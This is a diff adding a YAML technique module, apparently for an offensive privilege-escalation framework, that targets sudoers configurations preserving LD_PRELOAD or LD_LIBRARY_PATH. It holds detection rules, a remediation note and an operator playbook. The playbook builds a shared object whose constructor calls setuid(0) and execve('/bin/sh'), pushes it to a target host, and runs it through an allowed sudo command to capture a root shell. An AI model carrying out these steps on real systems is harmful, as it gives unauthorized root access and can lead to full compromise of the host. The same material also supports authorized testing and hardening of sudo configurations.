@@ -1,0 +1,64 @@
+# Sudo preserves LD_PRELOAD / LD_LIBRARY_PATH → root
+#
+# When sudoers explicitly keeps LD_PRELOAD or LD_LIBRARY_PATH in the
+# preserved environment (Defaults env_keep+="LD_PRELOAD"), a
+# non-privileged user can compile a shared object with a root-setting
+# constructor and load it via any sudo-allowed command. The .so's
+# constructor runs before the sudo target's main(), as root. Ported
+# from privesc._d_sudo_env.
+#
+# MITRE: T1574.006 (Dynamic Linker Hijacking) — LD_PRELOAD abuse.
+# Prepared rather than auto-fired: needs an operator to build the
+# .so from an arsenal template + know an allowed sudo command to
+# use as the vehicle.
+technique: T1574.006
+name: sudo preserves LD_PRELOAD / LD_LIBRARY_PATH → root
+tactic: [privilege-escalation, defense-evasion]
+platform: [linux]
+key: sudo:env-preload
+ranking:
+  exploitability: high         # deterministic when the env_keep is set
+  safety: config-change        # drops a .so on the target
+  detection: moderate
+detect:
+  sudo_env_keep_any:
+    - LD_PRELOAD
+    - LD_LIBRARY_PATH
+execute:
+  # Prepare-only marker — the real fire comes from the playbook. The
+  # command below shows the operator what the invocation looks like.
+  command: |-
+    echo "sudo LD_PRELOAD={{stage}}/p.so <an-allowed-cmd>  # see playbook"
+verify:
+  success: "sudo LD_PRELOAD"
+cleanup:
+  command: |-
+    rm -f {{stage}}/p.so
+report:
+  vector_type: ld_preload
+  evidence: "sudo -l: env_keep+={{binary}}"
+  description: >
+    sudoers preserves LD_PRELOAD (and/or LD_LIBRARY_PATH) in the
+    child environment. An attacker builds a shared object whose
+    constructor runs `setuid(0); execve("/bin/sh")` (or similar),
+    then invokes any sudo-allowed command with
+    `sudo LD_PRELOAD=path/to/mal.so <cmd>`. The constructor fires
+    as root before the sudo target's main, giving a root shell.
+  remediation: >
+    Remove `LD_PRELOAD` and `LD_LIBRARY_PATH` from `Defaults
+    env_keep+=…` in sudoers. There's rarely a legitimate reason to
+    preserve them; they exist specifically to bypass secure-linker
+    behavior.
+  refs: [T1574.006, sudo-env_keep, ld.so(8)]
+playbook:
+  summary: >
+    sudoers preserves {{binary}} — a linker-hijack primitive on any
+    sudo-allowed command. Prepared rather than auto-fired: needs a
+    built .so from the arsenal and a vehicle sudo command.
+  place: '{{stage}}/p.so'
+  steps:
+    - build the .so from the arsenal template (`fieldkit prep <host> sudo:env-preload --build`); its constructor calls setuid(0) + execve("/bin/sh")
+    - push {{stage}}/p.so to the target
+    - identify one sudo-allowed command from `sudo -l` (any binary the operator can invoke via sudo works)
+    - run `sudo LD_PRELOAD={{stage}}/p.so <that-command>` and capture the root shell
+  restore: rm -f {{stage}}/p.so
